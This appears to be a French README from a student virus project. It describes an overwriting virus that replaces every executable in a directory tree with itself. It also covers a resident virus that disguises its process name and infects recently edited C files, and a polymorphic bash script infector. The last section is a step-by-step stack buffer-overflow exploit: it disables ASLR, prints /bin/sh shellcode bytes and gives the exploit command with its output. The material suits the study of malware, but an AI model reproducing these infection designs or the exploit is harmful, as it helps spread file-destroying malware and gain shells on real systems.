Virus réalisés par Quentin Guardia (quentin.guardia@protonmail.com)

Faire très attention à l'éxecution des fichiers, certains peuvent corrompre des fichiers. Je ne suis pas responsable de vos actes

TODO: markdown pour meilleure lisibilité

------------ECRASEMENT------------
Le virus scanne en profondeur l'arborescence à partir du dossier dans lequel il se trouve.
Il détecte chaque fichier éxecutable.
Il les remplace par lui-même.
TODO: On pourrait ajouter une fonction qui permettrait de garder la taille originale de l'éxecutable infecté.


------------RESIDENT------------
Le virus crée un nouveau processus fils chaque seconde et tue le père.
Il se renomme avec un nom similaire à celui d'un programme de l'ordinateur.
Toute les 3 secondes, il scanne le dossier $HOME.
Il cherche alors un fichier .c édité il y a moins d'une heure.
S'il y en a un, il vérifie qu'il ne soit pas marqué.
S'il est marqué, il ne fait rien.
S'il n'est pas marqué, il ajoute sous la ligne du main une commande infectée et marque le fichier.


------------VBASHSUB------------
Ce virus a pour but de mélanger les lignes du programme infectant, le fichier2 à celle du programme hôte, le fichier1. On l’exécutera comme suit :
./vbashsub.sh fichier1 fichier2

Naîtra alors le fichier F3.sh, résultant du mélange. Le programme conserve l’ordre des lignes de chaque fichier dans le nouveau fichier. Pour chaque ligne du programme infectant, il laisse un commentaire à la fin indiquant le numéro de la ligne original. Ceci permettra au code de restauration de remettre le code viral dans son état initial pour pouvoir l’exécuter une nouvelle fois. On parle de polymorphisme dès lors qu’un virus change de forme au cours de l’infection. Afin d’ajouter un polymorphisme à ce virus, on fait en sorte que la commande de chaque ligne du programme infectant permute à chaque nouveau fichier infecté. 

TODO: Il manque maintenant à écrire un mode de restauration pour les fichiers infectés. Dans le principe, il faut récupérer dans des variables chaque ligne se terminant par un dièse, un arobase et un nombre pour les copier dans un fichier de script vierge. Toutefois, le fait de remplacer les commandes hasardeusement peut facilement engendrer des erreurs étant donné que chaque commande nécessite une syntaxe spécifique en ce qui concerne les arguments suivants.


------------INTRUSION------------
Le but est d’injecter le shellcode dans le débordement de tampon. On compile le programme vulnérable, intrusion.c, avec les options suivantes :
gcc intrusion.c -o intrusion -m32 -fno-stack-protector -z execstack
L’option -m32 n’est pas nécessaire sur les machines en 32bits. L'absence de certaines bibliothèques peut entraîner des erreurs.

On désactive l’ASLR par:
echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
Il suffit d’entrer la même commande avec 2 à la place de 0 pour réactiver l’ASLR. 

On désassemble le programme grâce à GDB:
gdb -q
intrusion disass fct 

La faille est observable grâce à 0x6c(%ebp). En effet, ebp indique le début de la pile et 0x6c vaut 108 en hexadécimal, ce qui veut dire que 108 bytes sont alloués pour tmp qui ne peut accueillir que 100 caractères. On sait qu’il faut 1 byte pour allouer un caractère. Il y a donc 8 bytes pour faire déborder tmp, en théorie.

shellcode.nasm est un shellcode trouvé sur internet exécutant la commande sys_execve(« /bin/sh », NULL,NULL). 

On assemble le code grâce à la commande :
nasm -f elf shellcode.nasm 
Ce qui offre le fichier objet shellcode.o, que l’on analyse avec objdump:
objdump -d -M intel shellcode.o 

Pour obtenir le shellcode, il faut s’appuyer sur les bytes contenus dans la deuxième colonne. On a alors : \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\ x2f\x62\x69\x89\xe3\xcd\x80\xb0\x01\x31\xdb\xcd\x80

On enregistre la variable d’environnement SHELLCODE en lui assignant le shellcode:
export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\ x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

On sait qu’il y a huit bytes de d’overflow sur 108 bytes de mémoire pour la variable vulnérable. Cependant, on ne connaît pas l’emplacement mémoire de la variable SHELLCODE. On peut la connaître grâce au programme contenu dans adresse.c, qui, en étant compilé et exécuté, donne : Adresse de SHELLCODE: 0xffffe9df
En shellcode, on peut l’appeler en inversant l’ordre de l’adresse : \xdf\xe9\xff\xff Ce qui prend 4 bytes. Sachant qu’il y a 108 bytes, de 0 à 107 et que le shellcode prend 4 bytes, alors on peut saturer les 103 premiers bytes
./intrusion $(python -c 'print "A"*103 + "\xdf\xe9\xff\xff"')

Il n’y a pas d’erreur de segmentation, comme en atteste la sortie standard : Affichage AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA A����
L’injection de shellcode est effectuée.

